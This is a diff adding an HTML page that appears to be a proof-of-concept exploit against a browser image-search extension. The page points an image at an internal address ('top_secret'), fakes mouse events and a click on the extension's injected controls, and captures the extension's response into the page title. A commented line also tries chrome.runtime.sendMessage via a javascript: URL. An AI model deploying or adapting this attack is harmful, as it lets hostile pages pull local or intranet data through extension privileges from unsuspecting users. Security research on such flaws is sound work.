@@ -1,0 +1,39 @@
+<html>
+	<head>
+		<title>old title</title>
+	</head>
+	<div>
+		<!-- <img src="javascript:chrome.runtime.sendMessage({action: 'fuck'});" onerror="this.src=''" style="height: 100px; width: 100px"> -->
+		<img id="fucker" src="http://127.0.1.14:1919/top_secret" style="height: 1000px; width: 1000px;" alt="Red dot" />
+		 <script>
+			function fucker() {
+				// console.log('fucker() called')
+				var elem0 = document.getElementsByClassName('index-module__imgSearch_wrapper--GU1Ct')[0]
+				var elem1 = document.getElementById('chrome_pc_imgSearch_leftWrapper')
+				var elem2 = document.getElementsByClassName('index-module__imgSearch_hover_content--c5JEb')[0]
+				var img_elem = document.getElementById("fucker")
+				var event = new MouseEvent('mousemove', {
+					'view': window,
+					'bubbles': true,
+					'cancelable': true,
+					'screenX': 100,
+					'screenY': 100,
+					'clientX': 100,
+					'clientY': 100,
+					'offsetX': 100,
+					'offsetY': 100,
+					// 'target': img_elem
+				});
+				
+				elem1.dispatchEvent(event);
+				window.addEventListener("sendDataToContentScript", (e) => {
+					document.title = e.detail.message
+				})
+				elem2.click();
+
+			}
+			setTimeout(()=>fucker(), 500)
+			// fucker()
+		 </script>
+	  </div>
+</html>
